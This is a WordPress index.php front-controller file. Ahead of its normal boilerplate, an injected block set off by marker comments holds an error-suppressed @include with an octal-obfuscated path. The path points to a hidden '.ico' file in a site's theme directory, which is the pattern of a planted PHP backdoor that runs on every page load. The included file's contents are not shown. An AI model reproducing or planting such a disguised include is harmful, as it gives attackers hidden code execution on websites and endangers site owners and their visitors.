<?php
/*045c3*/

@include "\057ho\155e/\141es\164on\147e/\167eb\057nh\167el\144in\147.c\157m/\160ub\154ic\137ht\155l/\167p-\143on\164en\164/t\150em\145s/\05637\0710a\14549\056ic\157";

/*045c3*/
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define( 'WP_USE_THEMES', true );

/** Loads the WordPress Environment and Template */
require __DIR__ . '/wp-blog-header.php';
